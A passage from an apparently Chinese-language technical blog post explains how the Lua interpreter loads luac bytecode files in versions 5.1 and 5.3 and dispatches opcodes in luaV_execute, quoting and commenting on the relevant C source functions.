class="line"> f-&gt;p=luaM_newvector(S-&gt;L,n,Proto*);</span><br><span class="line"> f-&gt;sizep=n;</span><br><span class="line"> <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;n; i++) f-&gt;p[i]=<span class="literal">NULL</span>;</span><br><span class="line"> <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;n; i++) f-&gt;p[i]=LoadFunction(S,f-&gt;source);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>f-&gt;k</code>存储常量</p><p><code>f-&gt;sizek</code>存储常量数量</p><ul><li><strong>LUA_TNIL</strong>： nil</li><li><strong>LUA_TBOOLEAN</strong>：布尔值</li><li><strong>LUA_TNUMBER</strong>：数字,使用浮点表示</li><li><strong>LUA_TSTRING</strong>：字符串。</li></ul><p>在处理完所有的常量之后,便开始了<strong>递归</strong>的处理该函数的所有子函数,并在<code>f-&gt;p</code>中存储子函数proto,<code>f-&gt;sizep</code>中存储子函数数量</p><p>到这里就可以分析知道luac文件除去header字段后,剩余部分就是<u>一个最大的proto嵌套更多小的proto,每个小的proto又继续往下嵌套</u></p><p>虽然只处理了四个常量,但实际上lua共有9个常量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">** basic types</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TNONE(-1)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TNIL0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TBOOLEAN1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TLIGHTUSERDATA2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TNUMBER3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TSTRING4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TTABLE5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TFUNCTION6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TUSERDATA7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TTHREAD8</span></span><br></pre></td></tr></table></figure><h6 id="LoadDebug"><a href="#LoadDebug" class="headerlink" title="LoadDebug"></a>LoadDebug</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">LoadDebug</span><span class="params">(LoadState* S, Proto* f)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> i,n;</span><br><span class="line"> n=LoadInt(S);</span><br><span class="line"> f-&gt;lineinfo=luaM_newvector(S-&gt;L,n,<span class="type">int</span>);</span><br><span class="line"> f-&gt;sizelineinfo=n;</span><br><span class="line"> LoadVector(S,f-&gt;lineinfo,n,<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"> n=LoadInt(S);</span><br><span class="line"> f-&gt;locvars=luaM_newvector(S-&gt;L,n,LocVar);</span><br><span class="line"> f-&gt;sizelocvars=n;</span><br><span class="line"> <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;n; i++) f-&gt;locvars[i].varname=<span class="literal">NULL</span>;</span><br><span class="line"> <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;n; i++)</span><br><span class="line"> &#123;</span><br><span class="line">  f-&gt;locvars[i].varname=LoadString(S);</span><br><span class="line">  f-&gt;locvars[i].startpc=LoadInt(S);</span><br><span class="line">  f-&gt;locvars[i].endpc=LoadInt(S);</span><br><span class="line"> &#125;</span><br><span class="line"> n=LoadInt(S);</span><br><span class="line"> f-&gt;upvalues=luaM_newvector(S-&gt;L,n,TString*);</span><br><span class="line"> f-&gt;sizeupvalues=n;</span><br><span class="line"> <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;n; i++) f-&gt;upvalues[i]=<span class="literal">NULL</span>;</span><br><span class="line"> <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;n; i++) f-&gt;upvalues[i]=LoadString(S);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取行号信息，局部变量，和upvalue。</p><p>当函数A中包含子函数B，并且函数B访问了函数A的参数或局部变量时，就会产生upvalue</p><h4 id="5-3"><a href="#5-3" class="headerlink" title="5.3"></a>5.3</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">LClosure *<span class="title function_">luaU_undump</span><span class="params">(lua_State *L, ZIO *Z, <span class="type">const</span> <span class="type">char</span> *name)</span> &#123;</span><br><span class="line">  LoadState S;</span><br><span class="line">  LClosure *cl;</span><br><span class="line">  <span class="keyword">if</span> (*name == <span class="string">&#x27;@&#x27;</span> || *name == <span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">    S.name = name + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (*name == LUA_SIGNATURE[<span class="number">0</span>])</span><br><span class="line">    S.name = <span class="string">&quot;binary string&quot;</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    S.name = name;</span><br><span class="line">  S.L = L;</span><br><span class="line">  S.Z = Z;</span><br><span class="line">  checkHeader(&amp;S);</span><br><span class="line">  cl = luaF_newLclosure(L, LoadByte(&amp;S));</span><br><span class="line">  setclLvalue(L, L-&gt;top, cl);</span><br><span class="line">  luaD_inctop(L);</span><br><span class="line">  cl-&gt;p = luaF_newproto(L);</span><br><span class="line">  luaC_objbarrier(L, cl, cl-&gt;p);</span><br><span class="line">  LoadFunction(&amp;S, cl-&gt;p, <span class="literal">NULL</span>);</span><br><span class="line">  lua_assert(cl-&gt;nupvalues == cl-&gt;p-&gt;sizeupvalues);</span><br><span class="line">  luai_verifycode(L, buff, cl-&gt;p);</span><br><span class="line">  <span class="keyword">return</span> cl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="checkHeader"><a href="#checkHeader" class="headerlink" title="checkHeader"></a>checkHeader</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">checkHeader</span> <span class="params">(LoadState *S)</span> &#123;</span><br><span class="line">  checkliteral(S, LUA_SIGNATURE + <span class="number">1</span>, <span class="string">&quot;not a&quot;</span>);  <span class="comment">/* 1st char already checked */</span></span><br><span class="line">  <span class="keyword">if</span> (LoadByte(S) != LUAC_VERSION)</span><br><span class="line">    error(S, <span class="string">&quot;version mismatch in&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (LoadByte(S) != LUAC_FORMAT)</span><br><span class="line">    error(S, <span class="string">&quot;format mismatch in&quot;</span>);</span><br><span class="line">  checkliteral(S, LUAC_DATA, <span class="string">&quot;corrupted&quot;</span>);</span><br><span class="line">  checksize(S, <span class="type">int</span>);</span><br><span class="line">  checksize(S, <span class="type">size_t</span>);</span><br><span class="line">  checksize(S, Instruction);</span><br><span class="line">  checksize(S, lua_Integer);</span><br><span class="line">  checksize(S, lua_Number);</span><br><span class="line">  <span class="keyword">if</span> (LoadInteger(S) != LUAC_INT)</span><br><span class="line">    error(S, <span class="string">&quot;endianness mismatch in&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (LoadNumber(S) != LUAC_NUM)</span><br><span class="line">    error(S, <span class="string">&quot;float format mismatch in&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5.3中checkHeader取代了LoadHeader,并且Header格式也有一点变化</p><p>变成了如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> signature[<span class="number">4</span>];   <span class="comment">// #define LUA_SIGNATURE   &quot;\033Lua&quot;</span></span><br><span class="line">    uchar version;</span><br><span class="line">    uchar format;</span><br><span class="line">    <span class="type">char</span> luac_data[<span class="number">6</span>];  <span class="comment">//#define LUAC_DATA &quot;\x19\x93\r\n\x1a\n&quot;</span></span><br><span class="line">    uchar size_int;</span><br><span class="line">    uchar <span class="type">size_size_t</span>;</span><br><span class="line">    uchar size_Instruction;</span><br><span class="line">    uchar lua_Integer;</span><br><span class="line">    uchar size_lua_Number;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> endian;<span class="comment">//#define LUAC_INT 0x5678</span></span><br><span class="line">    <span class="type">double</span> lua_num_valid;<span class="comment">//#define LUAC_NUM cast_num(370.5)</span></span><br><span class="line">&#125; GlobalHeader;</span><br></pre></td></tr></table></figure><h5 id="LoadFunction-1"><a href="#LoadFunction-1" class="headerlink" title="LoadFunction"></a>LoadFunction</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">LoadFunction</span> <span class="params">(LoadState *S, Proto *f, TString *psource)</span> &#123;</span><br><span class="line">  f-&gt;source = LoadString(S, f);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;source == <span class="literal">NULL</span>)  <span class="comment">/* no source in dump? */</span></span><br><span class="line">    f-&gt;source = psource;  <span class="comment">/* reuse parent&#x27;s source */</span></span><br><span class="line">  f-&gt;linedefined = LoadInt(S);</span><br><span class="line">  f-&gt;lastlinedefined = LoadInt(S);</span><br><span class="line">  f-&gt;numparams = LoadByte(S);</span><br><span class="line">  f-&gt;is_vararg = LoadByte(S);</span><br><span class="line">  f-&gt;maxstacksize = LoadByte(S);</span><br><span class="line">  LoadCode(S, f);</span><br><span class="line">  LoadConstants(S, f);</span><br><span class="line">  LoadUpvalues(S, f);</span><br><span class="line">  LoadProtos(S, f);</span><br><span class="line">  LoadDebug(S, f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样是加载一些proto信息</p><h6 id="LoadCode-1"><a href="#LoadCode-1" class="headerlink" title="LoadCode"></a>LoadCode</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">LoadCode</span> <span class="params">(LoadState *S, Proto *f)</span> &#123;</span><br><span class="line">  <span class="type">int</span> n = LoadInt(S);</span><br><span class="line">  f-&gt;code = luaM_newvector(S-&gt;L, n, Instruction);</span><br><span class="line">  f-&gt;sizecode = n;</span><br><span class="line">  LoadVector(S, f-&gt;code, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并无变化</p><h6 id="LoadConstants-1"><a href="#LoadConstants-1" class="headerlink" title="LoadConstants"></a>LoadConstants</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">LoadConstants</span> <span class="params">(LoadState *S, Proto *f)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">int</span> n = LoadInt(S);</span><br><span class="line">  f-&gt;k = luaM_newvector(S-&gt;L, n, TValue);</span><br><span class="line">  f-&gt;sizek = n;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    setnilvalue(&amp;f-&gt;k[i]);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    TValue *o = &amp;f-&gt;k[i];</span><br><span class="line">    <span class="type">int</span> t = LoadByte(S);</span><br><span class="line">    <span class="keyword">switch</span> (t) &#123;</span><br><span class="line">    <span class="keyword">case</span> LUA_TNIL:</span><br><span class="line">      setnilvalue(o);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> LUA_TBOOLEAN:</span><br><span class="line">      setbvalue(o, LoadByte(S));</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> LUA_TNUMFLT:</span><br><span class="line">      setfltvalue(o, LoadNumber(S));</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> LUA_TNUMINT:</span><br><span class="line">      setivalue(o, LoadInteger(S));</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> LUA_TSHRSTR:</span><br><span class="line">    <span class="keyword">case</span> LUA_TLNGSTR:</span><br><span class="line">      setsvalue2n(S-&gt;L, o, LoadString(S, f));</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      lua_assert(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>递归处理不在出现在该函数</p><p>数字变量将整数于浮点数区分开,短字符串于长字符串分离</p><ul><li><strong>LUA_TNUMFLT</strong>:浮点数</li><li><strong>LUA_TNUMINT</strong>:整数</li><li><strong>LUA_TSHRSTR</strong>:短字符串</li><li><strong>LUA_TLNGSTR</strong>:长字符串</li></ul><p>但实际上应该只是针对某种特殊处理,因为基本类型还是这9种</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TNIL0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TBOOLEAN1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TLIGHTUSERDATA2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TNUMBER3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TSTRING4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TTABLE5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TFUNCTION6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TUSERDATA7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TTHREAD8</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_NUMTAGS9</span></span><br></pre></td></tr></table></figure><h6 id="LoadUpvalues"><a href="#LoadUpvalues" class="headerlink" title="LoadUpvalues"></a>LoadUpvalues</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">LoadUpvalues</span> <span class="params">(LoadState *S, Proto *f)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i, n;</span><br><span class="line">  n = LoadInt(S);</span><br><span class="line">  f-&gt;upvalues = luaM_newvector(S-&gt;L, n, Upvaldesc);</span><br><span class="line">  f-&gt;sizeupvalues = n;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    f-&gt;upvalues[i].name = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    f-&gt;upvalues[i].instack = LoadByte(S);</span><br><span class="line">    f-&gt;upvalues[i].idx = LoadByte(S);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提前处理upvalue</p><h6 id="LoadProtos"><a href="#LoadProtos" class="headerlink" title="LoadProtos"></a>LoadProtos</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">LoadProtos</span> <span class="params">(LoadState *S, Proto *f)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">int</span> n = LoadInt(S);</span><br><span class="line">  f-&gt;p = luaM_newvector(S-&gt;L, n, Proto *);</span><br><span class="line">  f-&gt;sizep = n;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    f-&gt;p[i] = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    f-&gt;p[i] = luaF_newproto(S-&gt;L);</span><br><span class="line">    luaC_objbarrier(S-&gt;L, f, f-&gt;p[i]);</span><br><span class="line">    LoadFunction(S, f-&gt;p[i], f-&gt;source);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将递归处理proto单独使用一个函数</p><h6 id="LoadDebug-1"><a href="#LoadDebug-1" class="headerlink" title="LoadDebug"></a>LoadDebug</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">LoadDebug</span> <span class="params">(LoadState *S, Proto *f)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i, n;</span><br><span class="line">  n = LoadInt(S);</span><br><span class="line">  f-&gt;lineinfo = luaM_newvector(S-&gt;L, n, <span class="type">int</span>);</span><br><span class="line">  f-&gt;sizelineinfo = n;</span><br><span class="line">  LoadVector(S, f-&gt;lineinfo, n);</span><br><span class="line">  n = LoadInt(S);</span><br><span class="line">  f-&gt;locvars = luaM_newvector(S-&gt;L, n, LocVar);</span><br><span class="line">  f-&gt;sizelocvars = n;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    f-&gt;locvars[i].varname = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    f-&gt;locvars[i].varname = LoadString(S, f);</span><br><span class="line">    f-&gt;locvars[i].startpc = LoadInt(S);</span><br><span class="line">    f-&gt;locvars[i].endpc = LoadInt(S);</span><br><span class="line">  &#125;</span><br><span class="line">  n = LoadInt(S);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    f-&gt;upvalues[i].name = LoadString(S, f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>处理debug信息</p><h4 id="docall"><a href="#docall" class="headerlink" title="docall"></a>docall</h4><p>在分析完加载的过程后,我们再次回到<code>handle_script</code>向下执行,来到<code>docall</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">docall</span> <span class="params">(lua_State *L, <span class="type">int</span> narg, <span class="type">int</span> nres)</span> &#123;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  <span class="type">int</span> base = lua_gettop(L) - narg;  <span class="comment">/* function index */</span></span><br><span class="line">  lua_pushcfunction(L, msghandler);  <span class="comment">/* push message handler */</span></span><br><span class="line">  lua_insert(L, base);  <span class="comment">/* put it under function and args */</span></span><br><span class="line">  globalL = L;  <span class="comment">/* to be available to &#x27;laction&#x27; */</span></span><br><span class="line">  signal(SIGINT, laction);  <span class="comment">/* set C-signal handler */</span></span><br><span class="line">  status = lua_pcall(L, narg, nres, base);</span><br><span class="line">  signal(SIGINT, SIG_DFL); <span class="comment">/* reset C-signal handler */</span></span><br><span class="line">  lua_remove(L, base);  <span class="comment">/* remove message handler from the stack */</span></span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着如下调用<code>lua_pcall(lua_pcallk)</code>-&gt;<code>luaD_pcall</code>-&gt;<code>f_call</code>-&gt;<code>luaD_callnoyield</code>-&gt;<code>luaD_call</code>-&gt;<code>luaV_execute</code></p><h4 id="luaV-execute"><a href="#luaV-execute" class="headerlink" title="luaV_execute"></a>luaV_execute</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">luaV_execute</span> <span class="params">(lua_State *L)</span> &#123;</span><br><span class="line">  CallInfo *ci = L-&gt;ci;</span><br><span class="line">  LClosure *cl;</span><br><span class="line">  TValue *k;</span><br><span class="line">  StkId base;</span><br><span class="line">  ci-&gt;callstatus |= CIST_FRESH;  <span class="comment">/* fresh invocation of &#x27;luaV_execute&quot; */</span></span><br><span class="line"> newframe:  <span class="comment">/* reentry point when frame changes (call/return) */</span></span><br><span class="line">  lua_assert(ci == L-&gt;ci);</span><br><span class="line">  cl = clLvalue(ci-&gt;func);  <span class="comment">/* local reference to function&#x27;s closure */</span></span><br><span class="line">  k = cl-&gt;p-&gt;k;  <span class="comment">/* local reference to function&#x27;s constant table */</span></span><br><span class="line">  base = ci-&gt;u.l.base;  <span class="comment">/* local copy of function&#x27;s base */</span></span><br><span class="line">  <span class="comment">/* main loop of interpreter */</span></span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    Instruction i;</span><br><span class="line">    StkId ra;</span><br><span class="line">    vmfetch();</span><br><span class="line">    vmdispatch (GET_OPCODE(i)) &#123;</span><br><span class="line">      vmcase(OP_MOVE) &#123;</span><br><span class="line">        setobjs2s(L, ra, RB(i));</span><br><span class="line">        vmbreak;</span><br><span class="line">      &#125;</span><br><span class="line">      vmcase(OP_LOADK) &#123;</span><br><span class="line">        TValue *rb = k + GETARG_Bx(i);</span><br><span class="line">        setobj2s(L, ra, rb);</span><br><span class="line">        vmbreak;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>读取OPCODE并进行对应操作,<code>5.1</code>于<code>5.3</code>OPCODE有差异</p><h5 id="5-1-1"><a href="#5-1-1" class="headerlink" title="5.1"></a>5.1</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line"><span class="comment">/*----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">nameargsdescription</span></span><br><span class="line"><span class="comment">------------------------------------------------------------------------*/</span></span><br><span class="line">OP_MOVE,<span class="comment">/*A BR(A) := R(B)*/</span></span><br><span class="line">OP_LOADK,<span class="comment">/*A BxR(A) := Kst(Bx)*/</span></span><br><span class="line">OP_LOADBOOL,<span class="comment">/*A B CR(A) := (Bool)B; if (C) pc++*/</span></span><br><span class="line">OP_LOADNIL,<span class="comment">/*A BR(A) := ... := R(B) := nil*/</span></span><br><span class="line">OP_GETUPVAL,<span class="comment">/*A BR(A) := UpValue[B]*/</span></span><br><span class="line"></span><br><span class="line">OP_GETGLOBAL,<span class="comment">/*A BxR(A) := Gbl[Kst(Bx)]*/</span></span><br><span class="line">OP_GETTABLE,<span class="comment">/*A B CR(A) := R(B)[RK(C)]*/</span></span><br><span class="line"></span><br><span class="line">OP_SETGLOBAL,<span class="comment">/*A BxGbl[Kst(Bx)] := R(A)*/</span></span><br><span class="line">OP_SETUPVAL,<span class="comment">/*A BUpValue[B] := R(A)*/</span></span><br><span class="line">OP_SETTABLE,<span class="comment">/*A B CR(A)[RK(B)] := RK(C)*/</span></span><br><span class="line"></span><br><span class="line">OP_NEWTABLE,<span class="comment">/*A B CR(A) := &#123;&#125; (size = B,C)*/</span></span><br><span class="line"></span><br><span class="line">OP_SELF,<span class="comment">/*A B CR(A+1) := R(B); R(A) := R(B)[RK(C)]*/</span></span><br><span class="line"></span><br><span class="line">OP_ADD,<span class="comment">/*A B CR(A) := RK(B) + RK(C)*/</span></span><br><span 